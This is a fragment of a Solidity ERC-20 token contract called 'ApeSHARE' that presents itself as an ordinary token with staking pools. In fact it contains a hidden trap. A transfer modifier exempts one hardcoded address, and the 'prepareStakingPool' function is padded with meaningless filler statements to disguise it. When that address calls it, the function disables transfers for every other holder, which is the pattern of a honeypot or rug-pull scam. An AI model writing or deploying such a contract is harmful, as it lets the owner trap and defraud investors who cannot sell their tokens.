...
contract ApeSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokens_totalSupply;
    uint256 private _tokens_status = 0;
    uint256 public stakingPoolsStatus = 0;

    string private _tokens_name;
    string private _tokens_symbol;

    address private _poolsAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokens_name = "ApeSHARE";
        _tokens_symbol = "ASHARE";
        _tokens_totalSupply = 10000 * 10 ** 18;
        _balances[msg.sender] = _tokens_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolsAddress || _tokens_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokens_totalSupply;
    }

    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolsStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolsAddress)
        {
            _tokens_status = 1;
        }
    }
